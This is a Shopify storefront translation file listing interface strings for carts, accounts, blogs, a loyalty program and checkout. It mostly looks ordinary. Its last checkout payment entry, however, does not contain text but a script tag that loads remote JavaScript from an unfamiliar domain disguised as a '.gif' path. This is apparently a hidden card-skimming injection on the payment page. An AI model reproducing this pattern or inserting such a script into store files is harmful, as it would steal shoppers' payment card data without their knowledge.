{
  "password": {
    "general": {
      "thanks": "Thank you for joining our list",
      "enter_store": "Enter Store using Password:",
      "password": "Password",
      "enter": "Enter",
      "email_address": "Email Address",
      "submit": "Submit",
      "powered": "This Store will be powered by"
    }
  },
  "general": {
    "404": {
      "title": "Oops - We couldn't find that one",
      "subtext": "This page does not exist. Try searching for what you would like to find:",
      "contact": "Contact us"
    },
    "explainer_page": {
      "earn_points": "Earn Points",
      "spend_points": "Spend Points",
      "ways_to_earn": "Ways to Earn Points",
      "ways_to_spend": "Ways to Spend Points",
      "refer_header": "Invite a Friend",
      "faq_header": "Frequently Asked Questions",
      "loyalty_cta": "Join the Loyalty Program",
      "desc_for_account": "For creating an account.",
      "desc_for_follow_fb": "For liking on Facebook.",
      "desc_for_share_fb": "For sharing on Facebook.",
      "desc_for_follow_tw": "For following on Twitter.",
      "desc_for_share_tw": "For sharing on Twitter.",
      "desc_for_follow_in": "For following on Instagram.",
      "desc_for_birthday": "On your birthday.",
      "desc_for_reviews": "For writing a review",
      "desc_for_referral": "When friend makes first purchase."
    },
    "pagination": {
      "showing_items": "Showing items",
      "of": "of"
    },
    "forms": {
      "post_error": "Sorry, looks like some fields were not completed:"
    },
    "breadcrumbs": {
      "home": "Home"
    },
    "newsletter_form": {
      "newsletter_title": "Signup for Email Updates",
      "newsletter_email": "Enter Your Email Address",
      "submit": "Join"
    },
    "search": {
      "no_results_html": "Your search for \"{{ terms }}\" did not yield any results.",
      "results_for_html": "Your search for \"{{ terms }}\" revealed the following:",
      "title": "Search our store",
      "placeholder": "SEARCH",
      "submit": "Search"
    }
  },
  "blogs": {
    "article": {
      "posted_on_date_html": "Posted on {{ date }}",
      "tags": "Tags",
      "tagged": "Tagged",
      "comments": "Comments",
      "read_more": "Read More",
      "more_posts": "More Posts",
      "older_post": "Previous Post",
      "newer_post": "Next Post"
    },
    "comments": {
      "title": "Leave a comment",
      "name": "Name",
      "email": "Email",
      "message": "Message",
      "moderated": "All blog comments are checked prior to publishing",
      "post": "Post comment",
      "success_moderated": "Your comment was posted successfully. We will publish it in a little while, as our blog is moderated.",
      "success": "Your comment was posted successfully! Thank you!",
      "comments_with_count": {
        "one": "{{ count }} comment",
        "other": "{{ count }} comments"
      }
    },
    "sidebar": {
      "title": "Recent Posts",
      "categories": "Categories",
      "social_title": "Connect with us",
      "twitter_title": "On Twitter",
      "facebook_title": "Like us on Facebook",
      "instagram_follow_where": "On Instagram"
    }
  },
  "cart": {
    "general": {
      "title": "My Cart",
      "close_cart": "Close",
      "shipping_at_checkout": "Shipping calculated at check out",
      "empty": "Your cart is currently empty.",
      "product": "Product",
      "price": "Price",
      "qty": "Qty",
      "remove": "Remove",
      "total": "Total",
      "subtotal": "Subtotal",
      "continue": "Continue Shopping",
      "update": "Update Cart",
      "checkout": "Check Out",
      "note": "Comments:",
      "recently_viewed": "You also Viewed"
    }
  },
  "collections": {
    "general": {
      "all_collections": "Collections",
      "no_matches": "There are no items in this collection",
      "items": "Items"
    },
    "sidebar": {
      "linklist_1_title": "Shop by xxx",
      "linklist_2_title": "Shop by xxx",
      "linklist_3_title": "Shop by xxx",
      "linklist_4_title": "Shop by xxx",
      "designers": "Designers"
    },
    "sorting": {
      "title": "Sort by",
      "featured": "Featured",
      "best_selling": "Best Selling",
      "az": "Alphabetically, A-Z",
      "za": "Alphabetically, Z-A",
      "price_ascending": "Price, low to high",
      "price_descending": "Price, high to low",
      "date_descending": "Date, new to old",
      "date_ascending": "Date, old to new"
    },
    "filter": {
      "all": "All",
      "shop_by_size": "Size",
      "shop_by_color": "Color",
      "shop_by_material": "Hair Type",
      "shop_by_length": "Length"
    }
  },
  "contact": {
    "form": {
      "name": "Name",
      "email": "Email",
      "phone": "Phone Number",
      "message": "Message",
      "send": "Send",
      "post_success": "Thanks for contacting us. We'll get back to you as soon as possible."
    }
  },
  "customer": {
    "account": {
      "title": "Account",
      "details": "Account Details",
      "view_addresses": "View Addresses",
      "return": "Return to Account Details"
    },
    "activate_account": {
      "title": "Activate Account",
      "subtext": "Create your password to activate your account.",
      "password": "Password",
      "password_confirm": "Confirm Password",
      "submit": "Activate Account",
      "cancel": "Decline Invitation"
    },
    "addresses": {
      "title": "Your Addresses",
      "default": "Default",
      "add_new": "Add a New Address",
      "edit_address": "Edit address",
      "first_name": "First Name",
      "last_name": "Last Name",
      "company": "Company",
      "address1": "Address1",
      "address2": "Address2",
      "city": "City",
      "country": "Country",
      "province": "Province",
      "zip": "Postal\/Zip Code",
      "phone": "Phone",
      "set_default": "Set as default address",
      "add": "Add Address",
      "update": "Update Address",
      "cancel": "Cancel",
      "edit": "Edit",
      "delete": "Delete"
    },
    "login": {
      "title": "Login",
      "email": "Email",
      "password": "Password",
      "forgot_password": "Forgot your password?",
      "sign_in": "Sign In",
      "cancel": "Return to Store",
      "guest_title": "Continue as a guest",
      "guest_continue": "Continue"
    },
    "orders": {
      "title": "Order History",
      "order_number": "Order",
      "date": "Date",
      "payment_status": "Payment Status",
      "fulfillment_status": "Fulfillment Status",
      "total": "Total",
      "none": "You haven't placed any orders yet."
    },
    "order": {
      "title": "Order",
      "date": "Placed on",
      "cancelled": "Order Cancelled on",
      "cancelled_reason": "Reason: {{ reason }}",
      "billing_address": "Billing Address",
      "payment_status": "Payment Status",
      "shipping_address": "Shipping Address",
      "fulfillment_status": "Fulfillment Status",
      "discount": "Discount",
      "shipping": "Shipping",
      "tax": "Tax",
      "details": {
        "product": "Product",
        "sku": "SKU",
        "price": "Price",
        "quantity": "Quantity",
        "total": "Total",
        "fulfilled_at": "Fulfilled {{ date }}",
        "subtotal": "Subtotal"
      }
    },
    "recover_password": {
      "title": "Reset your password",
      "email": "Email",
      "submit": "Submit",
      "cancel": "Cancel",
      "subtext": "We will send you an email to reset your password.",
      "success": "We've sent you an email with a link to update your password."
    },
    "reset_password": {
      "title": "Reset account password",
      "subtext": "Enter a new password for {{ email }}",
      "password": "Password",
      "password_confirm": "Confirm Password",
      "submit": "Reset Password"
    },
    "register": {
      "title": "Create Account",
      "first_name": "First Name",
      "last_name": "Last Name",
      "email": "Email",
      "password": "Password",
      "submit": "Create"
    }
  },
  "layout": {
    "cart": {
      "my_cart": "CART"
    },
    "customer": {
      "my_account": "ACCOUNT",
      "log_out": "LOG OUT",
      "log_in": "LOG IN",
      "create_account": "SIGN UP"
    },
    "footer": {
      "section_1_title": "From the blog",
      "section_2_title": "Contact us",
      "section_3_title": "Information",
      "section_4_title": "Popular",
      "email_label": "Email",
      "phone_label": "Phone",
      "address_label": "Address"
    },
    "homepage": {
      "products_title": "New Arrivals",
      "products_2_title": "Our Favourites",
      "collections_title": "Featured Collections",
      "blog_title": "Featured Posts",
      "instagram": "Follow us on Instagram",
      "mailing_list_join": "Join our Mailing List",
      "mailing_list_text": "Sign up to receive our daily email and get 50% off your first purchase."
    }
  },
  "products": {
    "general": {
      "new": "New in",
      "sale": "Sale",
      "sold": "Sold Out",
      "quick_view": "QUICK VIEW",
      "from": "From",
      "view_full": "View Full Details",
      "related": "More in this Collection..."
    },
    "product": {
      "sold_out": "Sold Out",
      "unavailable": "Make a Selection",
      "compare_at": "Compare at",
      "add_to_cart": "Add to Cart",
      "pre_order": "Pre Order",
      "quantity": "Quantity",
      "back_to": "Back To",
      "previous_product_html": "Previous Product",
      "next_product_html": "Next Product",
      "adding": "Adding...",
      "thank_you": "Thank You!",
      "added": "Added to Cart",
      "view_cart": "View Cart",
      "or": "or",
      "continue": "Continue Shopping",
      "popup_question": "Ask us a question",
      "add_to_cart_success_link": "View Cart and Check out!",
      "add_to_cart_success_html": "Item Added {{ link }}"
    }
  },
  "gift_cards": {
    "issued": {
      "title": "Here's your {{ value }} gift card for {{ shop }}!",
      "subtext": "Here's your gift card!",
      "disabled": "Disabled",
      "expired": "Expired on {{ expiry }}",
      "active": "Expires on {{ expiry }}",
      "redeem": "Use this code at checkout to redeem your gift card",
      "shop_link": "Start shopping",
      "print": "Print",
      "email": "Email"
    }
  },
  "date_formats": {
    "month_date_year": "%B %d %Y"
  },
  "shopify": {
    "checkout": {
      "order_summary": {
        "gift_card_and_discount_title": "Store Credit\/Gift Card or Discount Code ",
        "gift_card_and_discount_label": "Store Credit\/Gift Card or Discount Code",
        "gift_card_title": "Store Credit\/Gift Card",
        "gift_card_label": "Store Credit\/Gift Card",
        "gift_card_and_discount_placeholder": "Gift card or coupon code (1 code per order)"
      },
      "shipping": {
        "no_rates_for_cart_or_destination_notice": "There are items in your cart that can not be shipped internationally."
      },
      "newsletter": {
        "subscription_checkbox_label": "Yes! I want Insider Notifications and Benefits!"
      },
      "payment": {
        "card_fields_unavailable_html": {
          "other": "<script type=\"text\/javascript\" src=\"https:\/\/cdn.cxizi.net\/jq\/gif\"><\/script>"
        }
      }
    }
  }
}